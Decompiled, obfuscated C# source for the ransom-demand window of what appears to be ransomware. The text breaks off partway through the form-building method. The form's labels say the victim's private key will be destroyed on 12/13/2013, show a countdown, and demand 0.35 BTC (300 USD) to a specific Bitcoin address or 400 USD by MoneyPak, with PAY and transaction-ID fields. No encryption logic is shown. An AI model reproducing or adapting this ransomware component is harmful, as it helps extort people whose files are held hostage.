using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace Final
{
	public class Form2 : Form
	{
		private IContainer icontainer_0;

		private PictureBox pictureBox_0;

		private Label label_0;

		private Label label_1;

		private Label label_2;

		private Label label_3;

		private Label label_4;

		private Label label_5;

		private Label label_6;

		private Label label_7;

		private Button button_0;

		private Timer timer_0;

		private Label label_8;

		private Label label_9;

		private Label label_10;

		private Label label_11;

		private Label label_12;

		private Label label_13;

		private Panel panel_0;

		private Label label_14;

		private ComboBox comboBox_0;

		private Panel panel_1;

		private Label label_15;

		private Label label_16;

		private PictureBox pictureBox_1;

		private Label label_17;

		private Label label_18;

		private Label label_19;

		private Label label_20;

		private Label label_21;

		private LinkLabel linkLabel_0;

		private LinkLabel linkLabel_1;

		private Panel panel_2;

		private Label label_22;

		private Panel panel_3;

		private Label label_23;

		private PictureBox pictureBox_2;

		private LinkLabel linkLabel_2;

		private PictureBox pictureBox_3;

		private LinkLabel linkLabel_3;

		private LinkLabel linkLabel_4;

		private LinkLabel linkLabel_5;

		private Label label_24;

		private Label label_25;

		private TextBox textBox_0;

		private Label label_26;

		private Label label_27;

		private TextBox textBox_1;

		private ComboBox comboBox_1;

		private ComboBox comboBox_2;

		private Label label_28;

		private TextBox textBox_2;

		private Label label_29;

		private ComboBox comboBox_3;

		private Label label_30;

		private Label label_31;

		private Label label_32;

		private Button button_1;

		private TextBox textBox_3;

		private Label label_33;

		private Button button_2;

		private GClass0 gclass0_0 = new GClass0();

		private GClass0.GStruct0 gstruct0_0;

		private string string_0;

		private Timer timer_1 = Delegate15.smethod_0();

		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = Delegate85.smethod_0(this);
				Delegate87.smethod_0(createParams, Delegate86.smethod_0(createParams) | 512);
				return createParams;
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.icontainer_0 != null)
			{
				this.icontainer_0.Dispose();
			}
			Delegate40.smethod_0(this, disposing);
		}

		private void method_0()
		{
			this.icontainer_0 = Delegate1.smethod_0();
			ComponentResourceManager object_ = Delegate2.smethod_0(Delegate38.smethod_0(typeof(Form2).TypeHandle));
			this.pictureBox_0 = Delegate3.smethod_0();
			this.label_0 = Delegate4.smethod_0();
			this.label_1 = Delegate4.smethod_0();
			this.label_2 = Delegate4.smethod_0();
			this.label_3 = Delegate4.smethod_0();
			this.label_4 = Delegate4.smethod_0();
			this.label_5 = Delegate4.smethod_0();
			this.label_6 = Delegate4.smethod_0();
			this.label_7 = Delegate4.smethod_0();
			this.button_0 = Delegate5.smethod_0();
			this.timer_0 = Delegate6.smethod_0(this.icontainer_0);
			this.label_8 = Delegate4.smethod_0();
			this.label_9 = Delegate4.smethod_0();
			this.label_10 = Delegate4.smethod_0();
			this.label_11 = Delegate4.smethod_0();
			this.label_12 = Delegate4.smethod_0();
			this.label_13 = Delegate4.smethod_0();
			this.panel_0 = Delegate7.smethod_0();
			this.panel_1 = Delegate7.smethod_0();
			this.label_33 = Delegate4.smethod_0();
			this.textBox_3 = Delegate8.smethod_0();
			this.button_1 = Delegate5.smethod_0();
			this.label_31 = Delegate4.smethod_0();
			this.linkLabel_5 = Delegate9.smethod_0();
			this.linkLabel_0 = Delegate9.smethod_0();
			this.linkLabel_1 = Delegate9.smethod_0();
			this.label_21 = Delegate4.smethod_0();
			this.label_19 = Delegate4.smethod_0();
			this.label_20 = Delegate4.smethod_0();
			this.label_18 = Delegate4.smethod_0();
			this.label_17 = Delegate4.smethod_0();
			this.pictureBox_1 = Delegate3.smethod_0();
			this.panel_2 = Delegate7.smethod_0();
			this.label_30 = Delegate4.smethod_0();
			this.label_26 = Delegate4.smethod_0();
			this.textBox_0 = Delegate8.smethod_0();
			this.label_25 = Delegate4.smethod_0();
			this.label_24 = Delegate4.smethod_0();
			this.linkLabel_4 = Delegate9.smethod_0();
			this.linkLabel_3 = Delegate9.smethod_0();
			this.pictureBox_3 = Delegate3.smethod_0();
			this.label_22 = Delegate4.smethod_0();
			this.panel_3 = Delegate7.smethod_0();
			this.label_32 = Delegate4.smethod_0();
			this.comboBox_3 = Delegate10.smethod_0();
			this.label_29 = Delegate4.smethod_0();
			this.comboBox_2 = Delegate10.smethod_0();
			this.label_28 = Delegate4.smethod_0();
			this.textBox_2 = Delegate8.smethod_0();
			this.comboBox_1 = Delegate10.smethod_0();
			this.label_27 = Delegate4.smethod_0();
			this.textBox_1 = Delegate8.smethod_0();
			this.linkLabel_2 = Delegate9.smethod_0();
			this.pictureBox_2 = Delegate3.smethod_0();
			this.label_23 = Delegate4.smethod_0();
			this.comboBox_0 = Delegate10.smethod_0();
			this.label_14 = Delegate4.smethod_0();
			this.label_15 = Delegate4.smethod_0();
			this.label_16 = Delegate4.smethod_0();
			this.button_2 = Delegate5.smethod_0();
			((ISupportInitialize)this.pictureBox_0).BeginInit();
			Delegate41.smethod_0(this.panel_0);
			Delegate41.smethod_0(this.panel_1);
			((ISupportInitialize)this.pictureBox_1).BeginInit();
			Delegate41.smethod_0(this.panel_2);
			((ISupportInitialize)this.pictureBox_3).BeginInit();
			Delegate41.smethod_0(this.panel_3);
			((ISupportInitialize)this.pictureBox_2).BeginInit();
			Delegate41.smethod_1(this);
			Delegate42.smethod_0(this.pictureBox_0, null);
			Delegate42.smethod_1(this.pictureBox_0, (Image)Delegate43.smethod_0(object_, "pictureBox1.Image"));
			Delegate44.smethod_0(this.pictureBox_0, Delegate11.smethod_0(12, 57));
			Delegate45.smethod_0(this.pictureBox_0, "pictureBox1");
			Delegate46.smethod_0(this.pictureBox_0, Delegate12.smethod_0(255, 258));
			Delegate47.smethod_0(this.pictureBox_0, 2);
			Delegate48.smethod_0(this.pictureBox_0, false);
			Delegate49.smethod_0(this.label_0, true);
			Delegate50.smethod_0(this.label_0, Delegate13.smethod_0("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_0, Delegate51.smethod_0());
			Delegate44.smethod_0(this.label_0, Delegate11.smethod_0(66, 318));
			Delegate45.smethod_0(this.label_0, "label2");
			Delegate46.smethod_0(this.label_0, Delegate12.smethod_0(161, 14));
			Delegate53.smethod_0(this.label_0, 3);
			Delegate54.smethod_0(this.label_0, "Private key will be destroyed on");
			Delegate49.smethod_0(this.label_1, true);
			Delegate50.smethod_0(this.label_1, Delegate13.smethod_0("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_1, Delegate51.smethod_0());
			Delegate44.smethod_0(this.label_1, Delegate11.smethod_0(84, 334));
			Delegate45.smethod_0(this.label_1, "label3");
			Delegate46.smethod_0(this.label_1, Delegate12.smethod_0(126, 14));
			Delegate53.smethod_0(this.label_1, 4);
			Delegate54.smethod_0(this.label_1, "12/13/2013 00:00:00 PM");
			Delegate49.smethod_0(this.label_2, true);
			Delegate50.smethod_0(this.label_2, Delegate13.smethod_0("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_2, Delegate51.smethod_0());
			Delegate44.smethod_0(this.label_2, Delegate11.smethod_0(120, 384));
			Delegate45.smethod_0(this.label_2, "label5");
			Delegate46.smethod_0(this.label_2, Delegate12.smethod_0(47, 14));
			Delegate53.smethod_0(this.label_2, 6);
			Delegate54.smethod_0(this.label_2, "Time left");
			Delegate49.smethod_0(this.label_3, true);
			Delegate50.smethod_0(this.label_3, Delegate13.smethod_0("Arial", 15.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_3, Delegate51.smethod_1());
			Delegate44.smethod_0(this.label_3, Delegate11.smethod_0(110, 400));
			Delegate45.smethod_0(this.label_3, "label6");
			Delegate46.smethod_0(this.label_3, Delegate12.smethod_0(34, 24));
			Delegate53.smethod_0(this.label_3, 7);
			Delegate54.smethod_0(this.label_3, "00");
			Delegate49.smethod_0(this.label_4, true);
			Delegate50.smethod_0(this.label_4, Delegate13.smethod_0("Arial", 15.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_4, Delegate51.smethod_1());
			Delegate44.smethod_0(this.label_4, Delegate11.smethod_0(140, 400));
			Delegate45.smethod_0(this.label_4, "label7");
			Delegate46.smethod_0(this.label_4, Delegate12.smethod_0(17, 24));
			Delegate53.smethod_0(this.label_4, 8);
			Delegate54.smethod_0(this.label_4, ":");
			Delegate49.smethod_0(this.label_5, true);
			Delegate50.smethod_0(this.label_5, Delegate13.smethod_0("Arial", 15.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_5, Delegate51.smethod_1());
			Delegate44.smethod_0(this.label_5, Delegate11.smethod_0(155, 400));
			Delegate45.smethod_0(this.label_5, "label8");
			Delegate46.smethod_0(this.label_5, Delegate12.smethod_0(34, 24));
			Delegate53.smethod_0(this.label_5, 9);
			Delegate54.smethod_0(this.label_5, "00");
			Delegate49.smethod_0(this.label_6, true);
			Delegate50.smethod_0(this.label_6, Delegate13.smethod_0("Arial", 15.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_6, Delegate51.smethod_1());
			Delegate44.smethod_0(this.label_6, Delegate11.smethod_0(185, 400));
			Delegate45.smethod_0(this.label_6, "label9");
			Delegate46.smethod_0(this.label_6, Delegate12.smethod_0(17, 24));
			Delegate53.smethod_0(this.label_6, 10);
			Delegate54.smethod_0(this.label_6, ":");
			Delegate49.smethod_0(this.label_7, true);
			Delegate50.smethod_0(this.label_7, Delegate13.smethod_0("Arial", 15.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_7, Delegate51.smethod_1());
			Delegate44.smethod_0(this.label_7, Delegate11.smethod_0(198, 400));
			Delegate45.smethod_0(this.label_7, "label10");
			Delegate46.smethod_0(this.label_7, Delegate12.smethod_0(34, 24));
			Delegate53.smethod_0(this.label_7, 11);
			Delegate54.smethod_0(this.label_7, "00");
			Delegate52.smethod_1(this.button_0, Delegate51.smethod_2());
			Delegate56.smethod_0(Delegate55.smethod_0(this.button_0), 0);
			Delegate57.smethod_0(this.button_0, FlatStyle.Flat);
			Delegate50.smethod_0(this.button_0, Delegate13.smethod_0("Arial", 12f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.button_0, Delegate51.smethod_0());
			Delegate44.smethod_0(this.button_0, Delegate11.smethod_0(566, 520));
			Delegate45.smethod_0(this.button_0, "button1");
			Delegate46.smethod_0(this.button_0, Delegate12.smethod_0(140, 39));
			Delegate53.smethod_0(this.button_0, 13);
			Delegate54.smethod_0(this.button_0, "PAY");
			Delegate58.smethod_0(this.button_0, false);
			Delegate59.smethod_0(this.button_0, new EventHandler(this.method_3));
			Delegate60.smethod_0(this.timer_0, new EventHandler(this.method_2));
			Delegate49.smethod_0(this.label_8, true);
			Delegate52.smethod_1(this.label_8, Delegate51.smethod_0());
			Delegate50.smethod_0(this.label_8, Delegate13.smethod_0("Arial", 12f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_8, Delegate11.smethod_0(364, 105));
			Delegate45.smethod_0(this.label_8, "label11");
			Delegate46.smethod_0(this.label_8, Delegate12.smethod_0(0, 19));
			Delegate53.smethod_0(this.label_8, 22);
			Delegate49.smethod_0(this.label_9, true);
			Delegate52.smethod_1(this.label_9, Delegate51.smethod_0());
			Delegate50.smethod_0(this.label_9, Delegate13.smethod_0("Arial", 12f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_9, Delegate11.smethod_0(344, 135));
			Delegate45.smethod_0(this.label_9, "label12");
			Delegate46.smethod_0(this.label_9, Delegate12.smethod_0(0, 19));
			Delegate53.smethod_0(this.label_9, 23);
			Delegate49.smethod_0(this.label_10, true);
			Delegate52.smethod_1(this.label_10, Delegate51.smethod_0());
			Delegate50.smethod_0(this.label_10, Delegate13.smethod_0("Arial", 12f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_10, Delegate11.smethod_0(305, 164));
			Delegate45.smethod_0(this.label_10, "label13");
			Delegate46.smethod_0(this.label_10, Delegate12.smethod_0(0, 19));
			Delegate53.smethod_0(this.label_10, 24);
			Delegate49.smethod_0(this.label_11, true);
			Delegate52.smethod_1(this.label_11, Delegate51.smethod_0());
			Delegate50.smethod_0(this.label_11, Delegate13.smethod_0("Arial", 12f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_11, Delegate11.smethod_0(341, 192));
			Delegate45.smethod_0(this.label_11, "label14");
			Delegate46.smethod_0(this.label_11, Delegate12.smethod_0(0, 19));
			Delegate53.smethod_0(this.label_11, 25);
			Delegate49.smethod_0(this.label_12, true);
			Delegate52.smethod_1(this.label_12, Delegate51.smethod_0());
			Delegate50.smethod_0(this.label_12, Delegate13.smethod_0("Arial", 12f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_12, Delegate11.smethod_0(321, 251));
			Delegate45.smethod_0(this.label_12, "label16");
			Delegate46.smethod_0(this.label_12, Delegate12.smethod_0(0, 19));
			Delegate53.smethod_0(this.label_12, 27);
			Delegate49.smethod_0(this.label_13, true);
			Delegate50.smethod_0(this.label_13, Delegate13.smethod_0("Arial", 15.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_13, Delegate51.smethod_0());
			Delegate44.smethod_0(this.label_13, Delegate11.smethod_0(356, 25));
			Delegate45.smethod_0(this.label_13, "label1");
			Delegate46.smethod_0(this.label_13, Delegate12.smethod_0(256, 24));
			Delegate53.smethod_0(this.label_13, 0);
			Delegate54.smethod_0(this.label_13, "Payment for private key!");
			Delegate52.smethod_1(this.panel_0, Delegate51.smethod_0());
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_0), this.panel_1);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_0), this.panel_2);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_0), this.panel_3);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_0), this.comboBox_0);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_0), this.label_14);
			Delegate44.smethod_0(this.panel_0, Delegate11.smethod_0(277, 57));
			Delegate45.smethod_0(this.panel_0, "panel1");
			Delegate46.smethod_0(this.panel_0, Delegate12.smethod_0(432, 450));
			Delegate53.smethod_0(this.panel_0, 29);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_1), this.label_33);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_1), this.textBox_3);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_1), this.button_1);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_1), this.label_31);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_1), this.linkLabel_5);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_1), this.linkLabel_0);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_1), this.linkLabel_1);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_1), this.label_21);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_1), this.label_19);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_1), this.label_20);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_1), this.label_18);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_1), this.label_17);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_1), this.pictureBox_1);
			Delegate44.smethod_0(this.panel_1, Delegate11.smethod_0(10, 70));
			Delegate45.smethod_0(this.panel_1, "panel2");
			Delegate46.smethod_0(this.panel_1, Delegate12.smethod_0(408, 354));
			Delegate53.smethod_0(this.panel_1, 2);
			Delegate49.smethod_0(this.label_33, true);
			Delegate50.smethod_0(this.label_33, Delegate13.smethod_0("Arial", 9f, FontStyle.Regular, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_33, Delegate11.smethod_0(12, 247));
			Delegate45.smethod_0(this.label_33, "label34");
			Delegate46.smethod_0(this.label_33, Delegate12.smethod_0(93, 15));
			Delegate53.smethod_0(this.label_33, 13);
			Delegate54.smethod_0(this.label_33, "Transaction ID: ");
			Delegate44.smethod_0(this.textBox_3, Delegate11.smethod_0(105, 244));
			Delegate63.smethod_0(this.textBox_3, 64);
			Delegate45.smethod_0(this.textBox_3, "textBox4");
			Delegate46.smethod_0(this.textBox_3, Delegate12.smethod_0(286, 20));
			Delegate53.smethod_0(this.textBox_3, 12);
			Delegate44.smethod_0(this.button_1, Delegate11.smethod_0(266, 214));
			Delegate45.smethod_0(this.button_1, "button3");
			Delegate46.smethod_0(this.button_1, Delegate12.smethod_0(65, 23));
			Delegate53.smethod_0(this.button_1, 11);
			Delegate54.smethod_0(this.button_1, "Copy");
			Delegate58.smethod_0(this.button_1, true);
			Delegate59.smethod_0(this.button_1, new EventHandler(this.method_16));
			Delegate49.smethod_0(this.label_31, true);
			Delegate50.smethod_0(this.label_31, Delegate13.smethod_0("Arial", 9f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_31, Delegate11.smethod_0(161, 194));
			Delegate45.smethod_0(this.label_31, "label32");
			Delegate46.smethod_0(this.label_31, Delegate12.smethod_0(30, 15));
			Delegate53.smethod_0(this.label_31, 10);
			Delegate54.smethod_0(this.label_31, "BTC");
			Delegate64.smethod_0(this.linkLabel_5, Delegate51.smethod_3());
			Delegate49.smethod_0(this.linkLabel_5, true);
			Delegate50.smethod_0(this.linkLabel_5, Delegate13.smethod_0("Arial", 9f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate64.smethod_1(this.linkLabel_5, Delegate51.smethod_3());
			Delegate44.smethod_0(this.linkLabel_5, Delegate11.smethod_0(16, 326));
			Delegate45.smethod_0(this.linkLabel_5, "linkLabel7");
			Delegate46.smethod_0(this.linkLabel_5, Delegate12.smethod_0(122, 15));
			Delegate53.smethod_0(this.linkLabel_5, 9);
			Delegate65.smethod_0(this.linkLabel_5, true);
			Delegate54.smethod_0(this.linkLabel_5, "How to get bitcoins?");
			Delegate64.smethod_2(this.linkLabel_5, Delegate51.smethod_3());
			Delegate66.smethod_0(this.linkLabel_5, new LinkLabelLinkClickedEventHandler(this.method_11));
			Delegate64.smethod_0(this.linkLabel_0, Delegate51.smethod_3());
			Delegate49.smethod_0(this.linkLabel_0, true);
			Delegate50.smethod_0(this.linkLabel_0, Delegate13.smethod_0("Arial", 9f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate64.smethod_1(this.linkLabel_0, Delegate51.smethod_3());
			Delegate44.smethod_0(this.linkLabel_0, Delegate11.smethod_0(16, 302));
			Delegate45.smethod_0(this.linkLabel_0, "linkLabel2");
			Delegate46.smethod_0(this.linkLabel_0, Delegate12.smethod_0(160, 15));
			Delegate53.smethod_0(this.linkLabel_0, 7);
			Delegate65.smethod_0(this.linkLabel_0, true);
			Delegate54.smethod_0(this.linkLabel_0, "Getting started with Bitcoin");
			Delegate64.smethod_2(this.linkLabel_0, Delegate51.smethod_3());
			Delegate66.smethod_0(this.linkLabel_0, new LinkLabelLinkClickedEventHandler(this.method_10));
			Delegate64.smethod_0(this.linkLabel_1, Delegate51.smethod_3());
			Delegate49.smethod_0(this.linkLabel_1, true);
			Delegate50.smethod_0(this.linkLabel_1, Delegate13.smethod_0("Arial", 9f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate64.smethod_1(this.linkLabel_1, Delegate51.smethod_3());
			Delegate44.smethod_0(this.linkLabel_1, Delegate11.smethod_0(16, 279));
			Delegate45.smethod_0(this.linkLabel_1, "linkLabel1");
			Delegate46.smethod_0(this.linkLabel_1, Delegate12.smethod_0(72, 15));
			Delegate53.smethod_0(this.linkLabel_1, 6);
			Delegate65.smethod_0(this.linkLabel_1, true);
			Delegate54.smethod_0(this.linkLabel_1, "Home Page");
			Delegate64.smethod_2(this.linkLabel_1, Delegate51.smethod_3());
			Delegate66.smethod_0(this.linkLabel_1, new LinkLabelLinkClickedEventHandler(this.method_9));
			Delegate49.smethod_0(this.label_21, true);
			Delegate50.smethod_0(this.label_21, Delegate13.smethod_0("Arial", 9f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_21, Delegate11.smethod_0(12, 218));
			Delegate45.smethod_0(this.label_21, "label20");
			Delegate46.smethod_0(this.label_21, Delegate12.smethod_0(253, 15));
			Delegate53.smethod_0(this.label_21, 5);
			Delegate54.smethod_0(this.label_21, "18CJpdtdK1i5T6HvS2r6MrLZWkDW84NuKo");
			Delegate49.smethod_0(this.label_19, true);
			Delegate50.smethod_0(this.label_19, Delegate13.smethod_0("Arial", 9f, FontStyle.Regular, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_19, Delegate11.smethod_0(191, 194));
			Delegate45.smethod_0(this.label_19, "label19");
			Delegate46.smethod_0(this.label_19, Delegate12.smethod_0(169, 15));
			Delegate53.smethod_0(this.label_19, 4);
			Delegate54.smethod_0(this.label_19, "= 300 USD to Bitcoin address");
			Delegate49.smethod_0(this.label_20, true);
			Delegate50.smethod_0(this.label_20, Delegate13.smethod_0("Arial", 9f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_20, Delegate11.smethod_0(123, 194));
			Delegate45.smethod_0(this.label_20, "label18");
			Delegate46.smethod_0(this.label_20, Delegate12.smethod_0(31, 15));
			Delegate53.smethod_0(this.label_20, 3);
			Delegate54.smethod_0(this.label_20, "0.35");
			Delegate49.smethod_0(this.label_18, true);
			Delegate50.smethod_0(this.label_18, Delegate13.smethod_0("Arial", 9f, FontStyle.Regular, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_18, Delegate11.smethod_0(12, 193));
			Delegate45.smethod_0(this.label_18, "label17");
			Delegate46.smethod_0(this.label_18, Delegate12.smethod_0(100, 15));
			Delegate53.smethod_0(this.label_18, 2);
			Delegate54.smethod_0(this.label_18, "You have to send");
			Delegate49.smethod_0(this.label_17, true);
			Delegate50.smethod_0(this.label_17, Delegate13.smethod_0("Arial", 9f, FontStyle.Regular, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_17, Delegate11.smethod_0(12, 98));
			Delegate45.smethod_0(this.label_17, "label15");
			Delegate46.smethod_0(this.label_17, Delegate12.smethod_0(386, 90));
			Delegate53.smethod_0(this.label_17, 1);
			Delegate54.smethod_0(this.label_17, Delegate67.smethod_0(object_, "label15.Text"));
			Delegate42.smethod_1(this.pictureBox_1, (Image)Delegate43.smethod_0(object_, "pictureBox2.Image"));
			Delegate44.smethod_0(this.pictureBox_1, Delegate11.smethod_0(66, 2));
			Delegate45.smethod_0(this.pictureBox_1, "pictureBox2");
			Delegate46.smethod_0(this.pictureBox_1, Delegate12.smethod_0(282, 92));
			Delegate47.smethod_0(this.pictureBox_1, 0);
			Delegate48.smethod_0(this.pictureBox_1, false);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_2), this.label_30);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_2), this.label_26);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_2), this.textBox_0);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_2), this.label_25);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_2), this.label_24);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_2), this.linkLabel_4);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_2), this.linkLabel_3);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_2), this.pictureBox_3);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_2), this.label_22);
			Delegate44.smethod_0(this.panel_2, Delegate11.smethod_0(10, 70));
			Delegate45.smethod_0(this.panel_2, "panel3");
			Delegate46.smethod_0(this.panel_2, Delegate12.smethod_0(408, 354));
			Delegate53.smethod_0(this.panel_2, 8);
			Delegate49.smethod_0(this.label_30, true);
			Delegate50.smethod_0(this.label_30, Delegate13.smethod_0("Arial", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_30, Delegate11.smethod_0(171, 206));
			Delegate45.smethod_0(this.label_30, "label31");
			Delegate46.smethod_0(this.label_30, Delegate12.smethod_0(60, 16));
			Delegate53.smethod_0(this.label_30, 13);
			Delegate54.smethod_0(this.label_30, "400 USD");
			Delegate49.smethod_0(this.label_26, true);
			Delegate50.smethod_0(this.label_26, Delegate13.smethod_0("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_26, Delegate51.smethod_4());
			Delegate44.smethod_0(this.label_26, Delegate11.smethod_0(9, 293));
			Delegate45.smethod_0(this.label_26, "label27");
			Delegate46.smethod_0(this.label_26, Delegate12.smethod_0(377, 14));
			Delegate53.smethod_0(this.label_26, 12);
			Delegate54.smethod_0(this.label_26, "Make sure you entered the payment information correctly and click <<PAY>>.");
			Delegate44.smethod_0(this.textBox_0, Delegate11.smethod_0(169, 242));
			Delegate63.smethod_0(this.textBox_0, 16);
			Delegate45.smethod_0(this.textBox_0, "textBox1");
			Delegate46.smethod_0(this.textBox_0, Delegate12.smethod_0(207, 20));
			Delegate53.smethod_0(this.textBox_0, 11);
			Delegate49.smethod_0(this.label_25, true);
			Delegate50.smethod_0(this.label_25, Delegate13.smethod_0("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_25, Delegate11.smethod_0(8, 245));
			Delegate45.smethod_0(this.label_25, "label24");
			Delegate46.smethod_0(this.label_25, Delegate12.smethod_0(147, 14));
			Delegate53.smethod_0(this.label_25, 10);
			Delegate54.smethod_0(this.label_25, "Enter the MoneyPak number: ");
			Delegate49.smethod_0(this.label_24, true);
			Delegate50.smethod_0(this.label_24, Delegate13.smethod_0("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_24, Delegate11.smethod_0(8, 207));
			Delegate45.smethod_0(this.label_24, "label23");
			Delegate46.smethod_0(this.label_24, Delegate12.smethod_0(107, 14));
			Delegate53.smethod_0(this.label_24, 8);
			Delegate54.smethod_0(this.label_24, "Amount of payment: ");
			Delegate64.smethod_0(this.linkLabel_4, Delegate51.smethod_3());
			Delegate49.smethod_0(this.linkLabel_4, true);
			Delegate50.smethod_0(this.linkLabel_4, Delegate13.smethod_0("Arial", 9f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate64.smethod_1(this.linkLabel_4, Delegate51.smethod_3());
			Delegate44.smethod_0(this.linkLabel_4, Delegate11.smethod_0(8, 176));
			Delegate45.smethod_0(this.linkLabel_4, "linkLabel6");
			Delegate46.smethod_0(this.linkLabel_4, Delegate12.smethod_0(142, 15));
			Delegate53.smethod_0(this.linkLabel_4, 7);
			Delegate65.smethod_0(this.linkLabel_4, true);
			Delegate54.smethod_0(this.linkLabel_4, "MoneyPak store locator");
			Delegate64.smethod_2(this.linkLabel_4, Delegate51.smethod_3());
			Delegate66.smethod_0(this.linkLabel_4, new LinkLabelLinkClickedEventHandler(this.method_13));
			Delegate64.smethod_0(this.linkLabel_3, Delegate51.smethod_3());
			Delegate49.smethod_0(this.linkLabel_3, true);
			Delegate50.smethod_0(this.linkLabel_3, Delegate13.smethod_0("Arial", 9f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate64.smethod_1(this.linkLabel_3, Delegate51.smethod_3());
			Delegate44.smethod_0(this.linkLabel_3, Delegate11.smethod_0(9, 156));
			Delegate45.smethod_0(this.linkLabel_3, "linkLabel5");
			Delegate46.smethod_0(this.linkLabel_3, Delegate12.smethod_0(72, 15));
			Delegate53.smethod_0(this.linkLabel_3, 6);
			Delegate65.smethod_0(this.linkLabel_3, true);
			Delegate54.smethod_0(this.linkLabel_3, "Home Page");
			Delegate64.smethod_2(this.linkLabel_3, Delegate51.smethod_3());
			Delegate66.smethod_0(this.linkLabel_3, new LinkLabelLinkClickedEventHandler(this.method_12));
			Delegate42.smethod_1(this.pictureBox_3, (Image)Delegate43.smethod_0(object_, "pictureBox4.Image"));
			Delegate44.smethod_0(this.pictureBox_3, Delegate11.smethod_0(41, 3));
			Delegate45.smethod_0(this.pictureBox_3, "pictureBox4");
			Delegate46.smethod_0(this.pictureBox_3, Delegate12.smethod_0(335, 91));
			Delegate47.smethod_0(this.pictureBox_3, 1);
			Delegate48.smethod_0(this.pictureBox_3, false);
			Delegate49.smethod_0(this.label_22, true);
			Delegate50.smethod_0(this.label_22, Delegate13.smethod_0("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_22, Delegate11.smethod_0(8, 104));
			Delegate45.smethod_0(this.label_22, "label21");
			Delegate46.smethod_0(this.label_22, Delegate12.smethod_0(397, 42));
			Delegate53.smethod_0(this.label_22, 0);
			Delegate54.smethod_0(this.label_22, Delegate67.smethod_0(object_, "label21.Text"));
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_3), this.label_32);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_3), this.comboBox_3);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_3), this.label_29);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_3), this.comboBox_2);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_3), this.label_28);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_3), this.textBox_2);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_3), this.comboBox_1);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_3), this.label_27);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_3), this.textBox_1);
